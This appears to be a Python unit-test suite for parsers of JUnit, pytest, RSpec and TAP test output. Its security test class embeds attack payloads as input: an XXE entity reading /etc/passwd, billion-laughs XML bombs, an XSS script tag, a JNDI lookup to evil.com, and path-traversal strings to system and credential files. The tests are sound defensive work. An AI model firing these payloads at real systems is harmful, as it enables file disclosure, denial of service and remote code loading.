#!/usr/bin/env python3
"""
Test suite for TOPA parsers
"""

import sys
import unittest
from pathlib import Path

# Add src to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent / "src"))

from parsers.junit import JUnitParser
from parsers.pytest import PytestParser
from parsers.rspec import RSpecParser
from parsers.tap import TAPParser


class TestJUnitParser(unittest.TestCase):
    """Test JUnit XML parser."""

    def setUp(self):
        self.parser = JUnitParser()

    def test_parse_simple_xml(self):
        xml_content = """<?xml version="1.0" encoding="UTF-8"?>
<testsuite name="TestSuite" tests="2" failures="1" errors="0" time="1.0">
  <testcase name="test_pass" classname="TestClass" time="0.5"/>
  <testcase name="test_fail" classname="TestClass" time="0.5">
    <failure message="Expected true but was false">Assertion failed</failure>
  </testcase>
</testsuite>"""

        result = self.parser.parse(xml_content)

        self.assertEqual(result.total_tests, 2)
        self.assertEqual(result.passed_tests, 1)
        self.assertEqual(result.failed_tests, 1)
        self.assertEqual(result.error_tests, 0)
        self.assertEqual(len(result.file_results), 1)

        file_result = result.file_results[0]
        self.assertEqual(len(file_result.test_results), 2)

        # Check failed test
        failed_test = file_result.test_results[1]
        self.assertFalse(failed_test.passed)
        self.assertEqual(failed_test.name, "fail")

    def test_parse_with_errors(self):
        xml_content = """<?xml version="1.0" encoding="UTF-8"?>
<testsuite name="TestSuite" tests="1" failures="0" errors="1" time="1.0">
  <testcase name="test_error" classname="TestClass" time="0.5">
    <error message="NullPointerException">Error occurred</error>
  </testcase>
</testsuite>"""

        result = self.parser.parse(xml_content)

        self.assertEqual(result.total_tests, 1)
        self.assertEqual(result.error_tests, 1)

        error_test = result.file_results[0].test_results[0]
        self.assertFalse(error_test.passed)
        self.assertTrue(error_test.is_error)
        self.assertIn("NullPointerException", error_test.error_message)


class TestPytestParser(unittest.TestCase):
    """Test pytest output parser."""

    def setUp(self):
        self.parser = PytestParser()

    def test_parse_pytest_output(self):
        pytest_output = """
FAILED test_user.py::test_validation - assert False == True
PASSED test_user.py::test_creation
ERROR test_auth.py::test_login - NameError: name 'AuthService' is not defined
===== 1 failed, 1 passed, 1 error in 1.23s =====
"""

        result = self.parser.parse(pytest_output)

        # Should extract from summary line or individual results
        self.assertGreater(result.total_tests, 0)
        self.assertGreater(len(result.file_results), 0)

    def test_extract_assertion_values(self):
        # Test the base parser method
        expected, actual = self.parser._extract_assertion_values(
            "assert False == True"
        )
        self.assertEqual(expected, "False")
        self.assertEqual(actual, "True")


class TestRSpecParser(unittest.TestCase):
    """Test RSpec JSON parser."""

    def setUp(self):
        self.parser = RSpecParser()

    def test_parse_rspec_json(self):
        json_content = """{
  "summary": {
    "duration": 1.23,
    "example_count": 2,
    "failure_count": 1,
    "error_count": 0
  },
  "examples": [
    {
      "description": "passes validation",
      "status": "passed",
      "file_path": "./spec/user_spec.rb",
      "line_number": 10
    },
    {
      "description": "fails validation",
      "status": "failed",
      "file_path": "./spec/user_spec.rb",
      "line_number": 15,
      "exception": {
        "class": "RSpec::Expectations::ExpectationNotMetError",
        "message": "Expected true but got false"
      }
    }
  ]
}"""

        result = self.parser.parse(json_content)

        self.assertEqual(result.total_tests, 2)
        self.assertEqual(result.passed_tests, 1)
        self.assertEqual(result.failed_tests, 1)
        self.assertEqual(result.elapsed_time, "1.23s")

        file_result = result.file_results[0]
        failed_test = next(t for t in file_result.test_results if not t.passed)
        self.assertIsNotNone(failed_test.expected)
        self.assertIsNotNone(failed_test.actual)


class TestTAPParser(unittest.TestCase):
    """Test TAP parser."""

    def setUp(self):
        self.parser = TAPParser()

    def test_parse_tap_output(self):
        tap_content = """1..3
ok 1 - test passes
not ok 2 - test fails
# Expected: true
# Actual: false
ok 3 - another test passes"""

        result = self.parser.parse(tap_content)

        self.assertEqual(result.total_tests, 3)
        self.assertEqual(result.passed_tests, 2)
        self.assertEqual(result.failed_tests, 1)

        file_result = result.file_results[0]
        self.assertEqual(len(file_result.test_results), 3)

        # Check failed test has diagnostic info
        failed_test = file_result.test_results[1]
        self.assertFalse(failed_test.passed)
        self.assertEqual(failed_test.name, "test fails")


class TestTokenBudget(unittest.TestCase):
    """Test token budget management."""

    def setUp(self):
        sys.path.insert(0, str(Path(__file__).parent.parent / "src"))
        from core.token_budget import TokenBudget

        self.TokenBudget = TokenBudget

    def test_token_estimation(self):
        budget = self.TokenBudget(1000)

        # Test basic estimation
        tokens = budget.estimate_tokens("hello world")
        self.assertGreater(tokens, 0)
        self.assertLess(tokens, 10)  # Should be reasonable

    def test_budget_consumption(self):
        budget = self.TokenBudget(100)

        # Consume some tokens
        consumed = budget.consume("test text")
        self.assertGreater(consumed, 0)
        self.assertLess(budget.remaining, 100)

    def test_smart_truncation(self):
        budget = self.TokenBudget(50)

        long_text = "This is a very long text that should be truncated " * 10
        truncated = budget.smart_truncate(long_text, max_tokens=10)

        self.assertLess(len(truncated), len(long_text))
        self.assertTrue(
            truncated.endswith("...") or len(truncated) < len(long_text)
        )

class TestEdgeCases(unittest.TestCase):
    """Test edge cases and error conditions."""
    
    def test_empty_input(self):
        """Test parsers handle empty input gracefully."""
        parsers = [JUnitParser(), PytestParser(), RSpecParser(), TAPParser()]
        
        for parser in parsers:
            with self.subTest(parser=parser.__class__.__name__):
                result = parser.parse("")
                self.assertIsInstance(result, type(parser.parse("")))
                self.assertEqual(result.total_tests, 0)
    
    def test_malformed_xml(self):
        """Test JUnit parser handles malformed XML."""
        parser = JUnitParser()
        
        malformed_xml = "<testsuite><testcase name='test' unclosed>"
        result = parser.parse(malformed_xml)
        
        # Should fallback to text parsing and not crash
        self.assertIsInstance(result, type(parser.parse("")))
    
    def test_unicode_handling(self):
        """Test parsers handle Unicode content."""
        parser = JUnitParser()
        
        unicode_xml = '''<?xml version="1.0" encoding="UTF-8"?>
<testsuite name="UnicodeTest" tests="1" failures="1">
  <testcase name="test_unicode" classname="TestClass">
    <failure message="Unicode test: 你好世界 🚀 ñáñá">Unicode failure: émojis 🎉</failure>
  </testcase>
</testsuite>'''
        
        result = parser.parse(unicode_xml)
        self.assertEqual(result.total_tests, 1)
        self.assertEqual(result.failed_tests, 1)
    
    def test_large_numbers(self):
        """Test parsers handle large test counts."""
        parser = TAPParser()
        
        # TAP with large plan number
        large_tap = "1..999999\nok 1 - test passes"
        result = parser.parse(large_tap)
        
        # Should handle gracefully (may add error for plan mismatch)
        self.assertGreaterEqual(result.total_tests, 1)
    
    def test_path_normalization_edge_cases(self):
        """Test path normalization with various edge cases."""
        sys.path.insert(0, str(Path(__file__).parent.parent / 'src'))
        from core.encoder import TOPAEncoder
        from core.token_budget import TokenBudget
        
        encoder = TOPAEncoder('failures', TokenBudget(1000))
        
        # Test various path formats
        test_paths = [
            "",  # Empty path
            "simple.rb",  # Simple filename
            "/very/long/path/to/some/deeply/nested/test/file.rb",  # Long path
            "C:\\Windows\\Path\\test.rb",  # Windows path
            "path/with spaces/test.rb",  # Path with spaces
            "файл.rb",  # Unicode filename
        ]
        
        for path in test_paths:
            with self.subTest(path=path):
                normalized = encoder._normalize_path(path)
                self.assertIsInstance(normalized, str)
                self.assertGreater(len(normalized), 0)  # Should never return empty
    
    def test_token_budget_edge_cases(self):
        """Test token budget with edge cases."""
        sys.path.insert(0, str(Path(__file__).parent.parent / 'src'))
        from core.token_budget import TokenBudget
        
        # Zero budget
        zero_budget = TokenBudget(0)
        self.assertFalse(zero_budget.has_budget())
        self.assertEqual(zero_budget.smart_truncate("test"), "")
        
        # Very small budget
        small_budget = TokenBudget(10)
        long_text = "This is a very long text" * 100
        truncated = small_budget.smart_truncate(long_text)
        self.assertLessEqual(len(truncated), 50)  # Should be much shorter
        
        # Extremely large budget
        large_budget = TokenBudget(1_000_000)
        self.assertTrue(large_budget.has_budget())


class TestSecurityEdgeCases(unittest.TestCase):
    """Test security-related edge cases and malicious input handling."""
    
    def test_xml_bomb_prevention(self):
        """Test protection against XML bombs (if defusedxml is available)."""
        parser = JUnitParser()
        
        # Create a potential XML bomb pattern (many nested entities)
        xml_bomb = '''<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY a "aaaaaaaaaa">
<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
]>
<testsuite name="BombTest" tests="1">
  <testcase name="test_bomb" classname="TestClass">
    <failure message="&c;">&c;</failure>
  </testcase>
</testsuite>'''
        
        # Should handle gracefully without consuming excessive resources
        # defusedxml should prevent entity processing, causing fallback to text parsing
        result = parser.parse(xml_bomb)
        self.assertIsInstance(result, type(parser.parse("")))
        # Should fall back to text parsing, finding at least the test structure
        self.assertGreaterEqual(result.total_tests, 0)
    
    def test_xxe_injection_prevention(self):
        """Test protection against XXE injection attacks."""
        parser = JUnitParser()
        
        # Attempt XXE injection
        xxe_xml = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE testsuite [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<testsuite name="XXETest" tests="1">
  <testcase name="test_xxe" classname="TestClass">
    <failure message="&xxe;">XXE test</failure>
  </testcase>
</testsuite>'''
        
        # Should handle without executing external entity
        # defusedxml should prevent XXE processing, causing fallback to text parsing
        result = parser.parse(xxe_xml)
        self.assertIsInstance(result, type(parser.parse("")))
        # Content should not contain system file content (should be prevented by defusedxml)
        for file_result in result.file_results:
            for test_result in file_result.test_results:
                self.assertNotIn("root:", str(test_result))  # Unix passwd indicator
    
    def test_billion_laughs_attack(self):
        """Test protection against billion laughs DoS attack."""
        parser = JUnitParser()
        
        # Billion laughs pattern
        billion_laughs = '''<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<testsuite name="BillionLaughsTest" tests="1">
  <testcase name="test_billion_laughs">
    <failure>&lol4;</failure>
  </testcase>
</testsuite>'''
        
        # Should complete within reasonable time/memory
        # defusedxml should prevent entity expansion, causing fallback to text parsing
        import time
        start_time = time.time()
        
        result = parser.parse(billion_laughs)
        
        end_time = time.time()
        # Should not take more than a few seconds (defusedxml prevents expansion)
        self.assertLess(end_time - start_time, 5.0)
        self.assertIsInstance(result, type(parser.parse("")))
    
    def test_malicious_cdata_handling(self):
        """Test handling of malicious CDATA sections."""
        parser = JUnitParser()
        
        malicious_cdata = '''<?xml version="1.0"?>
<testsuite name="CDATATest" tests="1">
  <testcase name="test_cdata">
    <failure><![CDATA[
      <script>alert('xss')</script>
      ../../etc/passwd
      ${jndi:ldap://evil.com/x}
    ]]></failure>
  </testcase>
</testsuite>'''
        
        result = parser.parse(malicious_cdata)
        self.assertEqual(result.total_tests, 1)
        # Should preserve CDATA content but not execute it
        self.assertGreaterEqual(len(result.file_results), 1)
    
    def test_path_normalization_security_display(self):
        """Test path normalization handles potentially malicious paths safely for display."""
        sys.path.insert(0, str(Path(__file__).parent.parent / 'src'))
        from core.encoder import TOPAEncoder
        from core.token_budget import TokenBudget
        
        encoder = TOPAEncoder('failures', TokenBudget(1000))
        
        # Test various edge case paths (these are for display, not file access)
        test_paths = [
            ("../../../etc/passwd", "etc/passwd"),  # Should use meaningful parts
            ("..\\..\\..\\windows\\system32\\config\\sam", "sam"),  # May keep original or use basename
            ("/etc/passwd", "passwd"),  # Should use basename for absolute paths
            ("normal_file.rb", "normal_file.rb"),  # Normal files unchanged
            ("", "unknown"),  # Empty path
        ]
        
        for path, expected_pattern in test_paths:
            with self.subTest(path=path):
                normalized = encoder._normalize_path(path)
                # Should always return a string
                self.assertIsInstance(normalized, str)
                self.assertGreater(len(normalized), 0)
                # For specific known cases, check expected patterns
                if expected_pattern:
                    self.assertTrue(
                        expected_pattern in normalized or 
                        normalized.endswith(expected_pattern.split('/')[-1]),
                        f"Expected pattern '{expected_pattern}' not found in '{normalized}'"
                    )


class TestResourceConstraints(unittest.TestCase):
    """Test behavior under resource constraints and large inputs."""
    
    def test_large_test_count(self):
        """Test handling of extremely large test counts."""
        parser = JUnitParser()
        
        # XML with very large test count attribute
        large_count_xml = f'''<?xml version="1.0"?>
<testsuite name="LargeCountTest" tests="{2**31-1}" failures="0">
  <testcase name="test_one" classname="TestClass"/>
</testsuite>'''
        
        result = parser.parse(large_count_xml)
        # Should handle gracefully without integer overflow
        self.assertIsInstance(result, type(parser.parse("")))
        self.assertGreaterEqual(result.total_tests, 1)
    
    def test_deeply_nested_xml(self):
        """Test handling of deeply nested XML structures."""
        parser = JUnitParser()
        
        # Create deeply nested XML (within reasonable limits)
        nested_depth = 100
        nested_xml = '<?xml version="1.0"?>\n'
        
        # Build nested structure
        for i in range(nested_depth):
            nested_xml += f'<level{i}>\n'
        
        nested_xml += '''<testsuite name="NestedTest" tests="1">
  <testcase name="test_nested" classname="TestClass"/>
</testsuite>\n'''
        
        for i in range(nested_depth-1, -1, -1):
            nested_xml += f'</level{i}>\n'
        
        # Should handle without stack overflow
        result = parser.parse(nested_xml)
        self.assertIsInstance(result, type(parser.parse("")))
    
    def test_many_small_testcases(self):
        """Test performance with many small test cases."""
        parser = JUnitParser()
        
        # Generate XML with many test cases
        testcase_count = 10000
        xml_parts = [
            '<?xml version="1.0"?>',
            f'<testsuite name="ManyTestsuite" tests="{testcase_count}" failures="0">'
        ]
        
        for i in range(testcase_count):
            xml_parts.append(f'  <testcase name="test_{i}" classname="TestClass{i % 100}"/>')
        
        xml_parts.append('</testsuite>')
        many_tests_xml = '\n'.join(xml_parts)
        
        import time
        start_time = time.time()
        
        result = parser.parse(many_tests_xml)
        
        end_time = time.time()
        
        # Should complete within reasonable time
        self.assertLess(end_time - start_time, 10.0)  # Max 10 seconds
        self.assertEqual(result.total_tests, testcase_count)
        self.assertEqual(result.failed_tests, 0)
    
    def test_extremely_long_test_names(self):
        """Test handling of extremely long test names."""
        parser = JUnitParser()
        
        # Create test with very long name
        long_name = "test_" + "x" * 10000
        long_name_xml = f'''<?xml version="1.0"?>
<testsuite name="LongNameTest" tests="1">
  <testcase name="{long_name}" classname="TestClass"/>
</testsuite>'''
        
        result = parser.parse(long_name_xml)
        self.assertEqual(result.total_tests, 1)
        # Should truncate or handle long names gracefully
        self.assertGreaterEqual(len(result.file_results), 1)
    
    def test_memory_efficient_parsing(self):
        """Test memory usage doesn't grow excessively during parsing."""
        parser = JUnitParser()
        
        # Parse multiple large files to test memory management
        large_xml = '''<?xml version="1.0"?>
<testsuite name="MemoryTest" tests="1000" failures="1000">'''
        
        for i in range(1000):
            large_xml += f'''
  <testcase name="test_{i}" classname="TestClass">
    <failure message="Failure message {i}">Stack trace for test {i}</failure>
  </testcase>'''
        
        large_xml += '\n</testsuite>'
        
        # Parse the same content multiple times
        for iteration in range(5):
            result = parser.parse(large_xml)
            self.assertEqual(result.total_tests, 1000)
            self.assertEqual(result.failed_tests, 1000)


class TestConcurrentAndThreadingSafety(unittest.TestCase):
    """Test concurrent access and threading safety."""
    
    def test_concurrent_parser_instances(self):
        """Test multiple parser instances can be used concurrently."""
        import threading
        import time
        
        # Create test data
        test_xml = '''<?xml version="1.0"?>
<testsuite name="ConcurrentTest" tests="10" failures="2">
  <testcase name="test_1" classname="TestClass"/>
  <testcase name="test_2" classname="TestClass">
    <failure message="Test failure">Stack trace</failure>
  </testcase>
  <testcase name="test_3" classname="TestClass"/>
  <testcase name="test_4" classname="TestClass">
    <failure message="Another failure">Another stack trace</failure>
  </testcase>
  <testcase name="test_5" classname="TestClass"/>
  <testcase name="test_6" classname="TestClass"/>
  <testcase name="test_7" classname="TestClass"/>
  <testcase name="test_8" classname="TestClass"/>
  <testcase name="test_9" classname="TestClass"/>
  <testcase name="test_10" classname="TestClass"/>
</testsuite>'''
        
        results = []
        errors = []
        
        def parse_in_thread(thread_id):
            """Parse XML in a separate thread."""
            try:
                parser = JUnitParser()
                for i in range(5):  # Parse multiple times per thread
                    result = parser.parse(test_xml)
                    results.append((thread_id, i, result.total_tests, result.failed_tests))
                    time.sleep(0.001)  # Small delay to increase chance of race conditions
            except Exception as e:
                errors.append((thread_id, str(e)))
        
        # Start multiple threads
        threads = []
        for i in range(5):
            thread = threading.Thread(target=parse_in_thread, args=(i,))
            threads.append(thread)
            thread.start()
        
        # Wait for all threads to complete
        for thread in threads:
            thread.join(timeout=10.0)  # 10 second timeout
        
        # Check results
        self.assertEqual(len(errors), 0, f"Parsing errors in threads: {errors}")
        self.assertEqual(len(results), 25)  # 5 threads * 5 parses each
        
        # All results should be consistent
        for thread_id, iteration, total, failed in results:
            self.assertEqual(total, 10, f"Thread {thread_id}, iteration {iteration}: expected 10 tests")
            self.assertEqual(failed, 2, f"Thread {thread_id}, iteration {iteration}: expected 2 failures")
    
    def test_thread_safety_with_different_inputs(self):
        """Test parsers handle different inputs concurrently."""
        import threading
        
        # Different test inputs
        test_inputs = [
            ('junit', '''<?xml version="1.0"?>
<testsuite name="JUnitTest" tests="3" failures="1">
  <testcase name="test_1"/><testcase name="test_2"><failure>fail</failure></testcase><testcase name="test_3"/>
</testsuite>'''),
            ('pytest', '''=== FAILURES ===
test_example.py::test_function FAILED
test_example.py::test_another PASSED
=== 1 failed, 1 passed in 0.02s ==='''),
            ('rspec', '''Finished in 0.12 seconds
3 examples, 1 failure
test_spec.rb:10 failure message'''),
            ('tap', '''1..3
ok 1 - test passes
not ok 2 - test fails
ok 3 - another test'''),
            ('empty', ''),
        ]
        
        results = {}
        errors = []
        
        def parse_input(input_type, content):
            """Parse input in thread."""
            try:
                # Import all parsers
                from parsers.junit import JUnitParser
                from parsers.pytest import PytestParser
                from parsers.rspec import RSpecParser
                from parsers.tap import TAPParser
                
                parsers = [JUnitParser(), PytestParser(), RSpecParser(), TAPParser()]
                
                thread_results = []
                for parser in parsers:
                    result = parser.parse(content)
                    thread_results.append({
                        'parser': parser.__class__.__name__,
                        'total_tests': result.total_tests,
                        'failed_tests': result.failed_tests
                    })
                
                results[input_type] = thread_results
            except Exception as e:
                errors.append((input_type, str(e)))
        
        # Start threads for different inputs
        threads = []
        for input_type, content in test_inputs:
            thread = threading.Thread(target=parse_input, args=(input_type, content))
            threads.append(thread)
            thread.start()
        
        # Wait for completion
        for thread in threads:
            thread.join(timeout=15.0)
        
        # Check results
        self.assertEqual(len(errors), 0, f"Threading errors: {errors}")
        self.assertEqual(len(results), 5, f"Expected 5 result sets, got {len(results)}")
        
        # Verify some expected patterns
        if 'junit' in results:
            junit_results = results['junit']
            junit_parser_result = next((r for r in junit_results if r['parser'] == 'JUnitParser'), None)
            if junit_parser_result:
                self.assertGreater(junit_parser_result['total_tests'], 0)
    
    def test_large_input_stability(self):
        """Test parser stability with large inputs over time."""
        import time
        
        parser = JUnitParser()
        
        # Generate large but reasonable test data
        large_xml_parts = ['<?xml version="1.0"?>', '<testsuite name="StabilityTest" tests="500" failures="100">']
        
        for i in range(500):
            if i % 5 == 0:  # Every 5th test fails
                large_xml_parts.append(f'<testcase name="test_{i}" classname="TestClass{i % 10}"><failure message="Failure {i}">Stack trace {i}</failure></testcase>')
            else:
                large_xml_parts.append(f'<testcase name="test_{i}" classname="TestClass{i % 10}"/>')
        
        large_xml_parts.append('</testsuite>')
        large_xml = '\n'.join(large_xml_parts)
        
        # Parse multiple times and verify consistency
        results = []
        for i in range(10):
            start_time = time.time()
            result = parser.parse(large_xml)
            end_time = time.time()
            
            results.append({
                'iteration': i,
                'total_tests': result.total_tests,
                'failed_tests': result.failed_tests,
                'parse_time': end_time - start_time,
            })
        
        # Verify consistency across iterations
        first_result = results[0]
        for result in results[1:]:
            self.assertEqual(result['total_tests'], first_result['total_tests'],
                           f"Test count inconsistent at iteration {result['iteration']}")
            self.assertEqual(result['failed_tests'], first_result['failed_tests'],
                           f"Failure count inconsistent at iteration {result['iteration']}")
        
        # Verify performance doesn't degrade significantly
        avg_time = sum(r['parse_time'] for r in results) / len(results)
        max_time = max(r['parse_time'] for r in results)
        
        # Max time shouldn't be more than 3x average (allows for some variation)
        self.assertLess(max_time, avg_time * 3.0, 
                       f"Performance degradation detected: max {max_time:.3f}s vs avg {avg_time:.3f}s")


if __name__ == "__main__":
    # Run tests
    unittest.main(verbosity=2)
